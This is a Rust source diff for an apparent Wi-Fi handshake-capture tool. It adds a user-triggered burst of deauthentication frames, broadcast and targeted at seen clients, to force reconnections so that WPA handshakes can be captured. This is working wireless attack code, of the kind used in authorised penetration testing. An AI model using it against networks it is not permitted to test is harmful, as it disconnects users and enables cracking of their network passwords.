@@ -355,6 +355,10 @@ pub struct CaptureOptions<'a> {
     pub duration: Option<u64>,
     pub no_deauth: bool,
     pub running: Option<Arc<AtomicBool>>, // External control for stopping
+    /// When set to `true` externally, the engine sends a single targeted deauth
+    /// burst against the current AP and clears the flag. Independent of
+    /// `no_deauth` so the user can trigger bursts on demand.
+    pub deauth_requested: Option<Arc<AtomicBool>>,
 }
 
 /// Capture traffic to a file
@@ -374,6 +378,7 @@ pub fn capture_traffic(options: CaptureOptions) -> Result<Option<String>> {
     let output_file = options.output_file;
     let duration = options.duration;
     let no_deauth = options.no_deauth;
+    let deauth_requested = options.deauth_requested.clone();
     println!("{}", "📡 Starting packet capture...");
     println!("Interface: {}", interface);
     println!("Output: {}", output_file);
@@ -888,6 +893,42 @@ pub fn capture_traffic(options: CaptureOptions) -> Result<Option<String>> {
                         }
                     }
                     last_deauth = std::time::Instant::now();
+                }
+            }
+        }
+
+        // 4. Manual deauth trigger (user-initiated from the UI).
+        // Runs independently of `no_deauth`: sends one bounded burst against the
+        // target AP to force connected clients to reconnect (and thus produce a
+        // capturable handshake). Note: packet injection silently fails on most
+        // macOS/Apple Silicon setups.
+        if let Some(flag) = &deauth_requested {
+            if flag.swap(false, Ordering::SeqCst) {
+                match target_bssid {
+                    Some(bssid) => {
+                        let clients = pending_handshakes.len();
+                        for _ in 0..5 {
+                            // Broadcast deauth (all clients on the AP).
+                            let _ = send_deauth(
+                                &mut cap,
+                                &bssid,
+                                &[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],
+                            );
+                            // Targeted deauth for any clients we have seen.
+                            for client in pending_handshakes.keys() {
+                                let _ = send_deauth(&mut cap, &bssid, client);
+                            }
+                        }
+                        println!(
+                            "📣 Manual deauth burst sent to {:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X} (broadcast + {} known client(s))",
+                            bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], clients
+                        );
+                    }
+                    None => {
+                        println!(
+                            "⚠️  Deauth requested, but the target AP has not been identified yet. Keep capturing until the target SSID's beacon is seen."
+                        );
+                    }
                 }
             }
         }
